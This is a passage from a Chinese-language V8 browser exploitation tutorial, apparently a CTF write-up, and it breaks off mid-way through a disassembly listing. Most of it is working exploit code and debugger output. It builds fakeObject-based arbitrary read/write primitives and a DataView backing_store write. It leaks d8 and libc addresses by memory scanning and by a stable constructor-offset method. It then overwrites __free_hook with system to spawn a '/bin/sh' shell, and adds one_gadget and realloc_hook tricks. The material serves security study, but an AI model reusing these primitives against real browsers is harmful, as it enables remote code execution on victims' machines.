+    pwndbg> job 0x15022c0cde19 <-- elements结构  
+    0x15022c0cde19: [FixedDoubleArray]  
+     - map: 0x27e8bae814f9 <Map>  
+     - length: 4  
+               0: 1  
+               1: 2  
+               2: 3  
+               3: 1.1  
+    pwndbg> telescope 0x15022c0cde18  
+    00:0000│   0x15022c0cde18 —▸ 0x27e8bae814f9 ◂— 0x27e8bae801  
+    01:0008│   0x15022c0cde20 ◂— 0x400000000  
+    02:0010│   0x15022c0cde28 ◂— 0x3ff0000000000000  <---- elements+0x10存储的才是数组元素  
+    03:0018│   0x15022c0cde30 ◂— 0x4000000000000000  
+    04:0020│   0x15022c0cde38 ◂— 0x4008000000000000  
+    05:0028│   0x15022c0cde40 ◂— 0x3ff199999999999a  
+    06:0030│   0x15022c0cde48 —▸ 0x2620a5202ed9 ◂— 0x4000027e8bae801  
+    07:0038│   0x15022c0cde50 —▸ 0x27e8bae80c71 ◂— 0x27e8bae808
+
+需要注意的是，elements对象+0x10的位置才是实际存储数组元素的地方。
+
+如果提前将fake_object构造为如下形式：
+
+    
+    
+    var fake_array = [  
+        float_array_map, // 这里填写之前oob泄露的某个float数组对象的map  
+        0,  
+        i2f(0x4141414141414141),  <-- elements指针  
+        i2f(0x400000000)  
+    ];
+
+我们很容易通过addreOf(fake_object)-0x20计算得出存储数组元素内容的内存地址，然后通过fakeObject函数就可以将这个地址强制转换成一个恶意构造的对象fake_object了。
+
+后续如果我们访问fake_object[0]，实际上访问的就是其elements指针即0x4141414141414141+0x10指向的内存内容了，而这个指针内容是我们完全可控的，因此可以写为我们想要访问的任意内存地址。利用上述一套s操作，我们就实现了任意地址读写。这一过程中的内存布局转换如下图所示：
+
+    
+    
+    +---> elements +---> +---------------+  
+    |                    |               |  
+    |                    +---------------+  
+    |                    |               |  
+    |                    +---------------+   fakeObject  +--------------+  
+    |                    |fake_array[0]  |  +----------> |   map        |  
+    |                    +---------------+               +--------------+         想 要 修 改 的  
+    |                    |fake_array[1]  |               |   prototype  |         内 存  
+    |                    +---------------+               +--------------+          +-------------+  
+    |                    |fake_array[2]  |               |   elements   | +------> |             |  
+    |                    +---------------+               +--------------+          |             |  
+    |                    |               |               |              |          |             |  
+    |                    |               |               |              |          |             |  
+    |    fake_array+-->  +---------------+               |              |          |             |  
+    |                    |   map         |               |              |          |             |  
+    |                    +---------------+               |              |          |             |  
+    |                    |   prototype   |               +--------------+          |             |  
+    |                    +---------------+                                         |             |  
+    +--------------------+   elements    |                                         |             |  
+                         +---------------+                                         |             |  
+                         |   length      |                                         |             |  
+                         +---------------+                                         |             |  
+                         |   properties  |                                         |             |  
+                         +---------------+                                         +-------------+
+
+上述逻辑主要涉及了对象和elements内存地址的相对偏移、elements内存地址与实际存储内容的相对偏移，不懂的童鞋可以好好画一下，捋顺这个构造过程。后续利用都需要以这一部分为基础。
+
+下面我们利用js语言实现上述任意地址读写的原语。
+
+    
+    
+    var fake_array = [  
+        float_array_map,  
+        i2f(0n),  
+        i2f(0x41414141n),  
+        i2f(0x1000000000n),  
+        1.1,  
+        2.2,  
+    ];  
+    ​  
+    var fake_array_addr = addressOf(fake_array);  
+    var fake_object_addr = fake_array_addr - 0x40n + 0x10n;  
+    var fake_object = fakeObject(fake_object_addr);  
+    ​  
+    function read64(addr)  
+    {  
+        fake_array[2] = i2f(addr - 0x10n + 0x1n);  
+        let leak_data = f2i(fake_object[0]);  
+        console.log("[*] leak from: 0x" +hex(addr) + ": 0x" + hex(leak_data));  
+        return leak_data;  
+    }  
+    ​  
+    function write64(addr, data)  
+    {  
+        fake_array[2] = i2f(addr - 0x10n + 0x1n);  
+        fake_object[0] = i2f(data);  
+        console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));      
+    }
+
+需要注意的是，我在fake_array中申请了6个元素占了0x30个内存长度，因此再加上elements对象10字节的map和length，总长度应该是0x40个长度，因此fake_object所在内存位置应该为addressOf(fake_array)-0x40+0x10。
+
+然后在v8中进行调试：
+
+    
+    
+    var a = [1.1, 2.2, 3.3];  
+    %DebugPrint(a);  
+    var a_addr = addressOf(a);  
+    console.log("[*] addressOf a: 0x" + hex(a_addr));  
+    ​  
+    read64(a_addr);  
+    %SystemBreak();  
+    ​  
+    write64(a_addr, 0x01020304n);  
+    %SystemBreak();
+
+gdb能够得到如下日志信息：
+
+    
+    
+    0x3d41cfb4fa19 <JSArray[3]>  
+    [*] addressOf a: 0x00003d41cfb4fa18  
+    [*] leak from: 0x00003d41cfb4fa18: 0x0000312055a82ed9  
+    pwndbg> c  
+    Continuing.  
+    [*] write to : 0x00003d41cfb4fa18: 0x0000000001020304  
+    pwndbg> telescope 0x00003d41cfb4fa18  
+    00:0000│   0x3d41cfb4fa18 ◂— 0x1020304  <---- 这里已经写入了我们想要写入的数据  
+    01:0008│   0x3d41cfb4fa20 —▸ 0x22229ec40c71 ◂— 0x22229ec408  
+    02:0010│   0x3d41cfb4fa28 —▸ 0x3d41cfb4f9f1 ◂— 0x22229ec414  
+    03:0018│   0x3d41cfb4fa30 ◂— 0x300000000
+
+最后可以发现，对象A的内存地址处确实写入了我们想要写入的数据。
+
+这一步需要注意的是，如果我们将fake_object的数组内容直接改写为：
+
+    
+    
+    var fake_array = [  
+        float_array_map,  
+        i2f(0n),  
+        i2f(0x41414141n),  
+        i2f(0x1000000000n),  
+    ];
+
+在gdb调试中你会发现，这种情况下fake_array的elements指针指向了addressOf(fake_array) +
+0x20的位置，而并不是我们之前理解的-0x30的位置。个人猜测，这应该和自己编写的64位无符号整数转浮点数的i2f函数有关系。如果是这样的话，就不存在oob的类型混淆了，但这并不影响这一步利用fakeObject实现任意地址读写的效果。但为了保证前后统一，还是建议在实际构造时，构造成6个元素的fake_array。
+
+说了这么多貌似很绕口，但希望大家能理解我说的上述注意事项的本质。
+
+## 0x05 任意地址读写怎么用：谈漏洞利用的思路
+
+通过上述类型混淆，我们实现了一套任意地址读写的漏洞利用原语。那如何实现利用呢？
+
+在传统堆漏洞的pwn中，利用过程是这样的：
+
+> 通过堆漏洞能够实现一个任意地址写的效果
+>
+> 结合程序功能和UAF漏洞泄露出一个libc地址
+>
+> 通过泄露的libc地址计算出free_hook、malloc_hook、system和one_gadget的内存地址
+>
+> 利用任意地址写将hook函数修改为System或one_gadget的地址，从而实现shell的执行
+
+因为我们在浏览器中，已经实现了任意地址读写的漏洞效果，因此这个传统的利用思路在v8中也同样适用。
+
+另外，v8中还有一种被称之为webassembly即wasm的技术。通俗来讲，v8可以直接执行其它高级语言生成的机器码，从而加快运行效率。存储wasm的内存页是RWX可读可写可执行的，因此我们还可以通过下面的思路执行我们的shellcode：
+
+> 利用webassembly构造一块RWX内存页
+>
+> 通过漏洞将shellcode覆写到原本属于webassembly机器码的内存页中
+>
+> 后续再调用webassembly函数接口时，实际上就触发了我们部署好的shellcode
+
+下面分别讲解一下上述两种思路的利用流程。
+
+## 0x06 传统的堆利用思路
+
+在传统的堆利用中，通常有以下利用方式：
+
+> 泄露libc地址修改free_hook为system
+>
+> 泄露libc地址修改free_hook、malloc_hook为one_gadget
+
+我们已经通过漏洞实现了任意地址读写原语，那么传统利用方式的难点就在于如何泄露libc地址了。只要泄露了libc地址，后面的修改hook然后执行的思路就很容易实现了。
+
+那如何泄露libc地址呢？下面具体讨论一下。在实践过程中，通过Google查询资料，自己总结出了两种泄露方式：随机泄露和稳定泄露。
+
+### 1\. 随机泄露
+
+通常情况下，我们在gdb中查看一个js对象的堆内存如下所示：
+
+    
+    
+    pwndbg> job 0x1be6c380fb59  
+    0x1be6c380fb59: [JSArray]  
+     - map: 0x39dda87c2ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]  
+     - prototype: 0x193429f91111 <JSArray[0]>  
+     - elements: 0x1be6c380fb31 <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]  
+     - length: 3  
+     - properties: 0x2e9708700c71 <FixedArray[0]> {  
+        #length: 0x2c24564401a9 <AccessorInfo> (const accessor descriptor)  
+     }  
+     - elements: 0x1be6c380fb31 <FixedDoubleArray[3]> {  
+               0: 1.1  
+               1: 2.2  
+               2: 3.3  
+     }  
+    pwndbg> telescope 0x1be6c380fb58  
+    00:0000│   0x1be6c380fb58 —▸ 0x39dda87c2ed9 ◂— 0x400002e97087001  
+    01:0008│   0x1be6c380fb60 —▸ 0x2e9708700c71 ◂— 0x2e97087008  
+    02:0010│   0x1be6c380fb68 —▸ 0x1be6c380fb31 ◂— 0x2e97087014  
+    03:0018│   0x1be6c380fb70 ◂— 0x300000000  
+    04:0020│   0x1be6c380fb78 ◂— 0x0  
+    ... ↓
+
+此时我们查看该内存上方很远很远的地方：
+
+    
+    
+    pwndbg> telescope 0x1be6c380fb58-0x8000 0x500  
+    00:0000│   0x1be6c3807b58 —▸ 0x2e9708704761 ◂— 0x4e00002e97087004  
+    01:0008│   0x1be6c3807b60 ◂— 0x31700000000  
+    ......  
+    478:23c0│   0x1be6c3809f18 —▸ 0x5637c71a45b0 ◂— push   rbp  <-- 属于d8内存空间的指令地址  
+    479:23c8│   0x1be6c3809f20 —▸ 0x2e9708700b71 ◂— 0x200002e97087001  
+    47a:23d0│   0x1be6c3809f28 —▸ 0x5637c71a45b0 ◂— push   rbp  
+    .....
+
+在gdb中用telescope命令查看会发现，在对象内存很远的地方会出现属于d8
+binary空间的指令地址0x5637c71a45b0，再看一下这个指令所属内存页，确实属于d8二进制空间：
+
+    
+    
+    pwndbg> vmmap 0x5637c71a45b0  
+    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  
+        0x5637c69d4000     0x5637c758a000 r-xp   bb6000 67b000 browser/x64.release/d8  
+    pwndbg> x/gx 0x5637c71a45b0  
+    0x5637c71a45b0 :    0x56415741e5894855
+
+也就是说在很远很远的地方，一定会存储着d8二进制中的指令地址，虽然程序开启了ASLR，但d8中的指令地址并不是完全随机的。我们能够确定的是，无论ASLR怎么随机，0x5637c71a45b0这一条指令地址的低3字节肯定为5b0。
+
+因此只要我们从当前对象的起始地址处开始向上低地址搜索，读取8字节内容，如果读取的8字节内容低三字节满足0x5b0这个条件，并且从这个内容为地址读取的内容如果为0x56415741e5894855，那么基本可以断定读取的这8字节即为d8中的指令地址了。
+
+上述内存搜索的思路，希望能好好理解一下。
+
+根据上述规律，写出泄露d8二进制汇总指令地址的JS代码，如下所示：
+
+    
+    
+    var a = [1.1, 2.2, 3.3];  
+    %DebugPrint(a);  
+    var start_addr = addressOf(a);  
+    var leak_d8_addr = 0n;  
+    while(1)  
+    {  
+        start_addr -= 0x8n;  
+        leak_d8_addr = read64(start_addr);  
+        if((leak_d8_addr & 0xfffn) == 0x05b0n && read64(leak_d8_addr) == 0x56415741e5894855n)  
+        {  
+            console.log("[*] Success find leak_d8_addr: 0x" + hex(leak_d8_addr));  
+            break;  
+        }  
+    }  
+    ​  
+    console.log("[*] Done.");
+
+gdb运行得到结果如下：
+
+    
+    
+    pwndbg> r  
+    0x2aadef9cfba9 <JSArray[3]>  
+    [*] Success find leak_d8_addr: 0x0000558dbe2d85b0  
+    [*] Done.
+
+后续操作就是，计算d8基地址，读取GOT表中malloc等libc函数的内存地址，然后然后计算free_hook或system或one_gadget的地址，最后将system或one_gadget写入free_hook触发hook调用即可实现命令执行，以libc.2.27.so为例，具体实现如下：
+
+    
+    
+    var d8_base_addr = leak_d8_addr -0xE4B5B0n;  
+    var d8_got_libc_start_main_addr = d8_base_addr + 0x128FB70n;  
+    ​  
+    var libc_start_main_addr = read64(d8_got_libc_start_main_addr);  
+    var libc_base_addr = libc_start_main_addr - 0x21ab0n;  
+    var libc_system_addr = libc_base_addr + 0x4f440n;  
+    var libc_free_hook_addr = libc_base_addr + 0x3ed8e8n;  
+    ​  
+    console.log("[*] find libc libc_free_hook_addr: 0x" + hex(libc_free_hook_addr));  <---- 正常  
+    %SystemBreak();  
+    ​  
+    write64(libc_free_hook_addr, libc_system_addr);  <---- 触发内存访问异常  
+    console.log("[*] Write ok.");  
+    %SystemBreak();
+
+当我们运行上述代码后会发现，我们能够正确读取获得libc_free_hook的内存地址，但当执行write64原语时，却触发了内存访问异常：
+
+    
+    
+    pwndbg> r  
+    [*] Success find libc addr: 0x000056420e8075b0  
+    [*] find libc libc_free_hook_addr: 0x00007f16f641b8e8  
+    ... ...  
+    RAX  0x7f16f6400000  
+    ... ...  
+     ► 0x56420e5756bd    mov    rax, qword ptr [rax + 0x30]  
+       0x56420e5756c1    cmp    rcx, qword ptr [rax - 0x8fe0]  
+       0x56420e5756c8    sete   al  
+       0x56420e5756cb    ret      
+    ... ...  
+    Program received signal SIGSEGV (fault address 0x7f16f6400030)  
+    pwndbg> 
+
+细心的童鞋应该会发现，我们要写的内存地址0x00007f16f641b8e8在write64时低20位却被程序莫名奇妙地改写为了0，从而导致了后续写入操作的失败。
+
+这是因为我们write64写原语使用的是FloatArray的写入操作，而Double类型的浮点数数组在处理7f开头的高地址时会出现将低20位与运算为0，从而导致上述操作无法写入的错误。这个解释不一定正确，希望知道的童鞋补充一下。出现的结果就是，直接用FloatArray方式向高地址写入会不成功。
+
+那怎么解决这一问题呢？我们借助DataView这个对象，将write写原语修改一下。DataView对象的使用方法如下：
+
+    
+    
+    // create an ArrayBuffer with a size in bytes  
+    var buffer = new ArrayBuffer(16);  
+    ​  
+    var view = new DataView(buffer);  
+    view.setUint32(0, 0x44434241, true);  
+    ​  
+    console.log(view.getUint8(0, true));  
+    %DebugPrint(view);  
+    %SystemBreak();
+
+将上述脚本单独存储为一个js文件，然后在gdb中调试：
+
+    
+    
+    pwndbg> r  
+    ... ...  
+    67  
+    0x1fa2f294b521 <DataView map = 0xe16c3e81719>  
+    ... ...  
+    pwndbg> job 0x1fa2f294b521  
+    0x1fa2f294b521: [JSDataView]  
+     - map: 0x0e16c3e81719 <Map(HOLEY_ELEMENTS)> [FastProperties]  
+     - prototype: 0x24c3b8b4aff9 <Object map = 0xe16c3e81769>  
+     - elements: 0x190f33840c71 <FixedArray[0]> [HOLEY_ELEMENTS]  
+     - embedder fields: 2  
+     - buffer =0x1fa2f294b4e1 <ArrayBuffer map = 0xe16c3e821b9>  <-- DataView的buffer信息  
+     - byte_offset: 0  
+     - byte_length: 16  
+     - properties: 0x190f33840c71 <FixedArray[0]> {}  
+     - embedder fields = {  
+        0, aligned pointer: (nil)  
+        0, aligned pointer: (nil)  
+     }  
+    pwndbg> job 0x1fa2f294b4e1  
+    0x1fa2f294b4e1: [JSArrayBuffer]  
+     - map: 0x0e16c3e821b9 <Map(HOLEY_ELEMENTS)> [FastProperties]  
+     - prototype: 0x24c3b8b4e981 <Object map = 0xe16c3e82209>  
+     - elements: 0x190f33840c71 <FixedArray[0]> [HOLEY_ELEMENTS]  
+     - embedder fields: 2  
+     - backing_store: 0x55fbe7cf1d00  <---- 存储实际内存地址的backing_store属性  
+     - byte_length: 16  
+     - detachable  
+     - properties: 0x190f33840c71 <FixedArray[0]> {}  
+     - embedder fields = {  
+        0, aligned pointer: (nil)  
+        0, aligned pointer: (nil)  
+     }  
+    pwndbg> telescope 0x55fbe7cf1d00    <---- buffer的实际内存地址  
+    00:0000│   0x55fbe7cf1d00 ◂— 0x44434241 /* 'ABCD' */  
+    01:0008│   0x55fbe7cf1d08 ◂— 0x0  
+    ... ↓
+
+从上面可以发现，DataView对象的buffer结构体中存储着的backing_store属性，记录的就是实际DataView申请的Buffer的内存地址。如果我们将这个backing_store指针修改为我们想要写入的内存地址比如0x41414141，那么我们再调用view.setUint32(0,
+0x44434241,
+true)类似指令时，实际上就是向内存地址0x41414141处写入了0x44434241，从而达到了任意地址写入的效果。这个基于DataView的写入，就不会触发FloatArray写入高地址的访问异常。
+
+因此，我们可以利用上述思路，编写对高地址内存进行改写的write64原语，具体实现如下所示：
+
+    
+    
+    var data_buf = new ArrayBuffer(8);  
+    var data_view = new DataView(data_buf);  
+    var buf_backing_store_addr = addressOf(data_buf) + 0x20n;  
+    ​  
+    function write64_dataview(addr, data)  
+    {  
+        write64(buf_backing_store_addr, addr);  
+        data_view.setFloat64(0, i2f(data), true);  
+        %SystemBreak();  
+        console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));  
+    }  
+    ​  
+    write64_dataview(libc_free_hook_addr, libc_system_addr);  
+    %SystemBreak();
+
+gdb中再调试上述js语句，可以发现成功写入：
+
+    
+    
+    pwndbg> r  
+    [*] Success find libc addr: 0x0000561ddc7a15b0  
+    [*] find libc libc_free_hook_addr: 0x00007fac69b538e8  
+    [*] write to : 0x00001d43f720e8c0: 0x00007fac69b538e8  
+    pwndbg> telescope 0x00007fac69b538e8  
+    00:0000│   0x7fac69b538e8 (__free_hook) —▸ 0x7fac697b5440 (system) ◂— test   rdi, rdi  
+    01:0008│   0x7fac69b538f0 (__malloc_initialize_hook) ◂— 0x0  
+    ... ↓
+
+建议这时候将%SystemBreak()断点下在write64_dataview内部，因为v8在运行时，会有很多内存释放、垃圾回收的操作，而这些操作很容易就能触发free函数，因此上面第二个%SystemBreak前很容易就触发到了free操作而导致gdb崩溃。
+
+最后申请一个局部buffer变量，然后释放，从而触发free操作：
+
+    
+    
+    function get_shell()  
+    {  
+        let get_shell_buffer = new ArrayBuffer(0x1000);  
+        let get_shell_dataview = new DataView(get_shell_buffer);  
+        get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn)); // str --> /bin/sh\x00   
+    }  
+    get_shell();
+
+注意，获取shell的演示需要在d8的非调试模式下直接运行才能看到效果。将脚本中的%DebugPrint和%SystemBreak等本地调试函数去掉，直接运行d8调用最终js文件：
+
+    
+    
+    root@kali:~/ctf/browser/x64.release$ ./d8 test.js   
+    [*] Success find libc addr: 0x00005588111845b0  
+    [*] find libc libc_free_hook_addr: 0x00007f48be0058e8  
+    [*] write to : 0x000019b28a68ea18: 0x00007f48be0058e8  
+    sh: 1: +•U: not found  
+    sh: 2: -•U: not found  
+    sh: 1: Syntax error: end of file unexpected (expecting ")")  
+    sh: 1: r•-•U: not found  
+    sh: 1: •-•U: not found  
+    sh: 1: •kZ•U: not found  
+    •h: 1: get_shell_buffer  
+     : not found  
+    ,: not found  
+    sh: 1: @$•U: not found  
+    sh: 1: @$•U: not found  
+    sh: 1: •$•U: not found  
+    sh: 1: Syntax error: EOF in backquote substitution  
+    $ uname -a  <---- 成功获取到shell  
+    Linux kali 4.18.0-18-generic #19~18.04.1-Ubuntu SMP Fri Apr 5 10:22:13 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux  
+    $ 
+
+在v8触发各种各样的free操作调用shell之后，终于释放了我们申请的局部buffer变量，成功获取shell！
+
+### 2\. 稳定泄露
+
+上面讲解了随机泄露的思路，虽然这种方式适用于很多情况，但万一当前对象内存低地址处并没有找到这样的d8二进制中的指令地址，或者向上遍历过程中，如果还没有遍历到需要的指令地址就触发了一个内存访问异常怎么办？
+
+因此上述套路总感觉有一定的不确定性，那么有没有一种稳定的方式来泄露d8的指令地址呢？
+
+答案是，当然有的。在调试上述随机泄露的过程中，由于对浏览器堆内存认识不熟悉，刚开始用手动的方式寻找上述指令地址。找了好久都没有找到，然后就各种Google查询，很幸运的是，我从Google发现了下面这种稳定的泄露方式。
+
+首先用gdb调试如下js代码：
+
+    
+    
+    var test_array = [1.1];  
+    %DebugPrint(test_array);  
+    %SystemBreak();
+
+查看数组对象的内存分布：
+
+    
+    
+    pwndbg> r  
+    0x2cf06adcfaa1 <JSArray[1]>  
+    pwndbg> job 0x2cf06adcfaa1  <-- 首先查看数组对象的内存结构  
+    0x2cf06adcfaa1: [JSArray]  
+     - map: 0x395878842ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]  
+     - prototype: 0x08d39f751111 <JSArray[0]>  
+     - elements: 0x2cf06adcfa89 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]  
+     - length: 1  
+     - properties: 0x13d0f3180c71 <FixedArray[0]> {  
+        #length: 0x2fd1d34801a9 <AccessorInfo> (const accessor descriptor)  
+     }  
+     - elements: 0x2cf06adcfa89 <FixedDoubleArray[1]> {  
+               0: 1.1  
+     }  
+    pwndbg> job 0x395878842ed9  <-- 然后查看数组对象的map类型  
+    0x395878842ed9: [Map]  
+     - type: JS_ARRAY_TYPE  
+     - instance size: 32  
+     - inobject properties: 0  
+     - elements kind: PACKED_DOUBLE_ELEMENTS  
+     - unused property fields: 0  
+     - enum length: invalid  
+     - back pointer: 0x395878842e89 <Map(HOLEY_SMI_ELEMENTS)>  
+     - prototype_validity cell: 0x2fd1d3480609 <Cell value= 1>  
+     - instance descriptors #1: 0x08d39f751f49 <DescriptorArray[1]>  
+     - layout descriptor: (nil)  
+     - transitions #1: 0x08d39f751eb9 <TransitionArray[4]>Transition array #1:  
+         0x13d0f3184ba1 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x395878842f29 <Map(HOLEY_DOUBLE_ELEMENTS)>  
+    ​  
+     - prototype: 0x08d39f751111 <JSArray[0]>  
+     - constructor: 0x08d39f750ec1 <JSFunction Array (sfi = 0x2fd1d3486791)> <-- 这里存在一个constructor构造  
+     - dependent code: 0x13d0f31802c1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>  
+     - construction counter: 0  
+    pwndbg> job 0x08d39f750ec1  <--  查看constructor  
+    0x8d39f750ec1: [Function] in OldSpace  
+     - map: 0x395878842d49 <Map(HOLEY_ELEMENTS)> [FastProperties]  
+     - prototype: 0x08d39f742109 <JSFunction (sfi = 0x2fd1d3483b29)>  
+     - elements: 0x13d0f3180c71 <FixedArray[0]> [HOLEY_ELEMENTS]  
+     - function prototype: 0x08d39f751111 <JSArray[0]>  
+     - initial_map: 0x395878842d99 <Map(PACKED_SMI_ELEMENTS)>  
+     - shared_info: 0x2fd1d3486791 <SharedFunctionInfo Array>  
+     - name: 0x13d0f3183599 <String[#5]: Array>  
+     - builtin: ArrayConstructor  
+     - formal_parameter_count: 65535  
+     - kind: NormalFunction  
+     - context: 0x08d39f741869 <NativeContext[246]>  
+     - code: 0x279fa3dc6981 <Code BUILTIN ArrayConstructor>  <-- 内置数组构造函数对象的地址  
+     - properties: 0x08d39f751029 <PropertyArray[6]> {  
+        #length: 0x2fd1d34804b9 <AccessorInfo> (const accessor descriptor)  
+        #name: 0x2fd1d3480449 <AccessorInfo> (const accessor descriptor)  
+        #prototype: 0x2fd1d3480529 <AccessorInfo> (const accessor descriptor)  
+        0x13d0f3184c79 <Symbol: (native_context_index_symbol)>: 11 (const data field 0) properties[0]  
+        0x13d0f3184f41 <Symbol: Symbol.species>: 0x08d39f750fd9 <AccessorPair> (const accessor descriptor)  
+        #isArray: 0x08d39f751069 <JSFunction isArray (sfi = 0x2fd1d3486829)> (const data field 1) properties[1]  
+        #from: 0x08d39f7510a1 <JSFunction from (sfi = 0x2fd1d3486879)> (const data field 2) properties[2]  
+        #of: 0x08d39f7510d9 <JSFunction of (sfi = 0x2fd1d34868b1)> (const data field 3) properties[3]  
+     }  
+    ​  
+     - feedback vector: not available  
+    pwndbg> job 0x279fa3dc6981  <--  数组构造函数对象  
+    0x279fa3dc6981: [Code]  
+     - map: 0x13d0f3180a31 <Map>  
+    kind = BUILTIN  
+    name = ArrayConstructor  
+    compiler = turbofan  
+    address = 0x7ffccb8d8fe8  
+    ​  
+    Trampoline (size = 13)  
+    0x279fa3dc69c0     0  49baa0dafb8843560000 REX.W movq r10,0x564388fbdaa0  (ArrayConstructor) <--d8指令地址  
+    0x279fa3dc69ca     a  41ffe2         jmp r10  
+    ​  
+    Instructions (size = 28)  
+    0x564388fbdaa0     0  493955d8       REX.W cmpq [r13-0x28] (root (undefined_value)),rdx  
+    0x564388fbdaa4     4  7405           jz 0x564388fbdaab  (ArrayConstructor)  
+    0x564388fbdaa6     6  488bca         REX.W movq rcx,rdx  
+    0x564388fbdaa9     9  eb03           jmp 0x564388fbdaae  (ArrayConstructor)  
+    0x564388fbdaab     b  488bcf         REX.W movq rcx,rdi  
+    0x564388fbdaae     e  498b5dd8       REX.W movq rbx,[r13-0x28] (root (undefined_value))  
+    0x564388fbdab2    12  488bd1         REX.W movq rdx,rcx  
+    0x564388fbdab5    15  e926000000     jmp 0x564388fbdae0  (ArrayConstructorImpl)  
+    0x564388fbdaba    1a  90             nop  
+    0x564388fbdabb    1b  90             nop  
+    ​  
+    Safepoints (size = 8)  
+    ​  
+    RelocInfo (size = 2)  
+    0x279fa3dc69c2  off heap target
+
+上述调试步骤具体为：
+
+查看Array对象结构 --> 查看对象的Map属性 --> 查看Map中指定的constructor结构 --> 查看code属性
+-->在code内存地址的固定偏移处存储了v8二进制的指令地址
+
+用telescope查看code内存地址处的内容：
+
+    
+    
+    pwndbg> telescope 0x279fa3dc6980 0x20  
+    00:0000│   0x279fa3dc6980 —▸ 0x13d0f3180a31 ◂— 0x13d0f31801  
+    01:0008│   0x279fa3dc6988 —▸ 0x13d0f3182c01 ◂— 0x13d0f31807  
+    02:0010│   0x279fa3dc6990 —▸ 0x13d0f3180c71 ◂— 0x13d0f31808  
+    03:0018│   0x279fa3dc6998 —▸ 0x13d0f3182791 ◂— 0x13d0f31807  
+    04:0020│   0x279fa3dc69a0 —▸ 0x2fd1d34916a9 ◂— 0xd1000013d0f31814  
+    05:0028│   0x279fa3dc69a8 ◂— or     eax, 0xc6000000 /* '\r' */  
+    06:0030│   0x279fa3dc69b0 ◂— sbb    al, 0  
+    07:0038│   0x279fa3dc69b8 ◂— and    al, 0 /* '$' */  
+    08:0040│   0x279fa3dc69c0 ◂— movabs r10, 0x564388fbdaa0 <-- 这里存储了d8中的指令地址  
+    09:0048│   0x279fa3dc69c8 ◂— add    byte ptr [rax], al  
+    0a:0050│   0x279fa3dc69d0 ◂— add    byte ptr [rax], al  
+    ... ↓
+
+可以发现在code偏移的0x40处出现了d8二进制内存空间的指令地址，vmmap确认一下：
+
+    
+    
+    pwndbg> vmmap 0x564388fbdaa0  
+    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  
+        0x564388689000     0x56438923f000 r-xp   bb6000 67b000 browser/x64.release/d8  
+    pwndbg> telescope 0x564388fbdaa0  
+    00:0000│   0x564388fbdaa0 (Builtins_ArrayConstructor) ◂— cmp    qword ptr [r13 - 0x28], rdx  
+    01:0008│   0x564388fbdaa8 (Builtins_ArrayConstructor+8) ◂— retf   0x3eb  
+    02:0010│   0x564388fbdab0 (Builtins_ArrayConstructor+16) ◂— pop    rbp  
+    03:0018│   0x564388fbdab8 (Builtins_ArrayConstructor+24) ◂— add    byte ptr [rax], al
+
+可以发现，这个指令确实是d8二进制中指令地址，主要用于内置数组的构造。
+
+也就是说，v8在生成一个数组对象过程中，会对应着生成一个code对象，这个code对象中存储了和该数组对象相关的构造函数指令，而这些构造函数指令又会去调用d8二进制中的指令地址来完成对数组对象的构造。
+
+因此，我们可以利用上述地址偏移，结合地址泄露addressOf和任意地址读取read64，稳定地得到一个v8中的二进制指令地址。具体的JavaScript实现思路如下所示：
+
+    
+    
+    var a = [1.1, 2.2, 3.3];  
+    %DebugPrint(a);  
+    var code_addr = read64(addressOf(a.constructor) + 0x30n);  
+    var leak_d8_addr = read64(code_addr + 0x41n);  
+    console.log("[*] find libc leak_d8_addr: 0x" + hex(leak_d8_addr));  
+    %SystemBreak();
+
+调试结果显示，我们已经成功获取到了d8内部的指令地址：
+
+    
+    
+    pwndbg> r  
+    0x0e11365d0631 <JSArray[3]>  
+    [*] find libc leak_d8_addr: 0x0000558c1a2f5aa0
+
+之后就和之前随机泄露的利用过程一样了，这里不再赘述。
+
+### 3\. one_gadget的技巧
+
+在利用上述随机泄露和稳定泄露获取libc地址后，除了将free_hook修改为system外，我们还可以利用one_gadget来触发system调用。通常我们找到的one_gadget是这样的：
+
+    
+    
+    browser/x64.release$ one_gadget /lib/x86_64-linux-gnu/libc-2.27.so  
+    0x4f2c5 execve("/bin/sh", rsp+0x40, environ)  
+    constraints:  
+      rcx == NULL  
+    ​  
+    0x4f322 execve("/bin/sh", rsp+0x40, environ)  
+    constraints:  
+      [rsp+0x40] == NULL  
+    ​  
+    0x10a38c execve("/bin/sh", rsp+0x70, environ)  
+    constraints:  
+      [rsp+0x70] == NULL
+
+学习过堆利用的都知道，触发上述one_gadget，需要保证寄存器或栈空间满足指定的要求才行。但大部分情况下，栈空间并不会满足上面的要求，那怎么触发呢？
+
+这时候可以利用realloc_hook结合malloc_hook调整栈空间布局，然后再触发one_gadget。具体思路如下所示。
+
+首先看一下malloc_hook上方地址：
+
+    
+    
+    pwndbg> print &__malloc_hook  
+    $1 = (void *(**)(size_t, const void *)) 0x7f8a635ccc30 <__malloc_hook>  
+    pwndbg> telescope 0x7f8a635ccc30-0x10  
+    00:0000│   0x7f8a635ccc20 (__memalign_hook) —▸ 0x7f8a63278410 (memalign_hook_ini) ◂— push   r14  
+    01:0008│   0x7f8a635ccc28 (__realloc_hook) —▸ 0x7f8a63279790 (realloc_hook_ini) ◂— push   r15  
+    02:0010│   0x7f8a635ccc30 (__malloc_hook) ◂— 0x0  
+    ... ↓
+
+可以发现malloc_hook-0x8的位置就是realloc_hook的地址，查看realloc函数内容：
+
+    
+    
+    .text:0000000000098C30                 push    r15             ; Alternative name is '__libc_realloc'  
+    .text:0000000000098C32                 push    r14  
+    .text:0000000000098C34                 push    r13  
+    .text:0000000000098C36                 push    r12  
+    .text:0000000000098C38                 push    rbp  
+    .text:0000000000098C39                 push    rbx  <-- 如果从这里执行栈空间就向高地址偏移了0x40个字节  
+    .text:0000000000098C3A                 sub     rsp, 18h  
+    .text:0000000000098C3E                 mov     rax, cs:__realloc_hook_ptr  
+    .text:0000000000098C45                 mov     rax, [rax]  
+    .text:0000000000098C48                 test    rax, rax  
